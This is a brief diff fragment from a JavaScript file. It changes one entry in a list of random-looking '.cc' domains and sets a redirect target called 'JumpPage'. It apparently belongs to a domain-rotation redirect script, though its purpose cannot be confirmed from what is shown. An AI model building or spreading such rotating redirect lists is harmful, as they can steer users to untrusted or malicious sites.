@@ -45,7 +45,7 @@ var urls=[];
         urls.push(".kqaxxojn.cc"); 
         urls.push(".qwkdzhrl.cc");
         urls.push(".briiimf.cc");
-        urls.push(".cvcvnhf.cc");    
+        urls.push(".crwspck.cc");    
            
 var JumpPage="https://nmzrctlm.cc";
 
